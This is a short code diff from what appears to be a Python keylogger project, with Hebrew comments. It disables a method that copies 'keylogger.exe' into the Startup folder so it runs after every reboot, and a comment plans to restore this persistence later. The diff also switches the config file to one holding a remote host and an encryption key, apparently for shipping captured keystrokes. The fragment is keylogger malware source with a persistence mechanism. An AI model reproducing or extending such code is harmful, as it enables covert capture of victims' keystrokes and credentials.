@@ -87,6 +87,10 @@ class KeyloggerManager:
     def stop(self) -> None:
         self.active = False
 
+
+    '''
+    שיפור להמשך כך שיהיה אפשר להעתיק את הקובץ לתפריט ההתחלה כך שידלק כל פעם
+    שהמשתמש מכבה ומדליק את המחשב וימשיך לעבוד כרגיל
     @staticmethod
     def copy_file():
         source = "keylogger.exe" #יצירת שם קובץ להעתקה
@@ -100,11 +104,12 @@ class KeyloggerManager:
                 os._exit(0) #כיבוי הקובץ הקיים כדי שלא יהיה כפול
         except:
             pass
+    '''
 
 
 if __name__ == '__main__':
     #קבלת הנתיב רשת והמפתח להצפנה
-    with open("../config.json",'r')as file:
+    with open("../keys.json",'r')as file:
         data = json.load(file)
         host = data["host"]
         key = data["key"]
